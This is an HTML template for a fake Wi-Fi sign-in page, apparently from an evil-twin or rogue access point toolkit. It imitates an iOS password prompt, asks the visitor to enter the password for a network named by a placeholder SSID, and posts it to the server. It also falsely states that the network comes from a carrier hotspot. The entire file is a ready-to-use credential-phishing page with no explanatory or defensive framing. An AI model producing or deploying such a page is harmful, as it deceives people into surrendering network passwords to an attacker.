<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Sign in</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,BlinkMacSystemFont,"SF Pro Text","Helvetica Neue",Arial,sans-serif;background:#0e0f12;color:#f5f5f7;min-height:100vh;display:flex;align-items:center;justify-content:center}
.ios{width:100%;max-width:400px;padding:28px 24px}
.lock{width:78px;height:78px;margin:0 auto 20px;border-radius:18px;background:#1d1f24;display:flex;align-items:center;justify-content:center}
.lock svg{width:36px;height:36px;fill:#8e8e93}
h1{font-size:22px;font-weight:700;text-align:center;margin-bottom:6px}
p{font-size:14px;color:#a6a6ad;text-align:center;margin-bottom:28px}
.box{background:#1d1f24;border-radius:12px;padding:4px 0}
.field{display:flex;align-items:center;padding:14px 16px;border-bottom:1px solid #2c2c32}
.field:last-child{border-bottom:none}
.field input{flex:1;background:transparent;border:none;outline:none;color:#f5f5f7;font-size:16px}
.field input::placeholder{color:#6e6e76}
button{width:100%;background:#2f6df6;border:none;border-radius:12px;padding:16px;color:#fff;font-size:17px;font-weight:600;margin-top:26px;cursor:pointer}
button:active{opacity:.85}
.cap{margin-top:22px;text-align:center}
.cap p{color:#a6a6ad;font-size:12px;margin-bottom:6px}
.cap a{color:#4c8dff;font-size:13px;text-decoration:none}
</style>
</head>
<body>
<div class="ios">
  <div class="lock"><svg viewBox="0 0 24 24"><path d="M12 1a5 5 0 0 0-5 5v2H6a2 2 0 0 0-2 2v9a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2v-9a2 2 0 0 0-2-2h-1V6a5 5 0 0 0-5-5zm-3 7V6a3 3 0 0 1 6 0v2H9z"/></svg></div>
  <h1>Sign in</h1>
  <p>Enter your password to join "__MALSTROM_SSID__"</p>
  <form id="f" action="/" method="post">
    <div class="box" style="margin-top:20px;">
      <div class="field"><input type="password" id="password" name="password" placeholder="Password" required autofocus></div>
    </div>
    <button type="submit">Continue</button>
  </form>
  <div class="cap"><p>This network is provided by a carrier hotspot</p></div>
</div>
</body>
</html>
